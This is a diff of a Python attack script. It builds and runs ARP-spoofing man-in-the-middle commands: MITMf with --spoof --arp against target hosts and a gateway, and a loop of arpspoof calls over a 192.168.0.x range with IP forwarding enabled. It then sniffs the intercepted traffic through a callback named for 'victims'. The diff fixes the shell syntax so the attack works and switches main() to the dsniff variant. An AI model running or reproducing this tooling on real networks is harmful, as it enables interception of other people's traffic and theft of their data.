@@ -46,29 +46,29 @@ def mitmf():
 		targets += v + ',' 
 	targets = targets.rstrip(',')
 	cmd = """
-	python mitmf -i eth0
-		--spoof
-		--arp
-		--target {},
-		--gateway {}
+	python mitmf -i eth0 \
+		--spoof \
+		--arp \
+		--target {}, \
+		--gateway {} \
 	""".format(targets, GATEWAY_ADDRESS)
 	os.system(cmd)
 
 def dsniff():
 	cmd = """
 	echo 1 > /proc/sys/net/ipv4/ip_forward ;
-	for x in $(seq {} $[{}-1]) ;
+	for x in $(seq {} $(({}-1)) ) ;
 	do
-		arpspoof -t {} 192.168.0.$x > /dev/null 2> /dev/null & ;
-		arpspoof -t 192.168.0.$x {} > /dev/null 2> /dev/null & ;
+		arpspoof -t {} 192.168.0.$x > /dev/null 2> /dev/null & 
+		arpspoof -t 192.168.0.$x {} > /dev/null 2> /dev/null & 
 	done
 	""".format(*IP_RANGE, GATEWAY_ADDRESS, GATEWAY_ADDRESS)
 	os.system(cmd)
 
 def main():
-	#dsniff()
+	dsniff()
 	#bettercap()
-	mitmf()
+	#mitmf()
 	try:
 		sniff(filter="ip", prn=wait_all_victims)
 	except PermissionError:
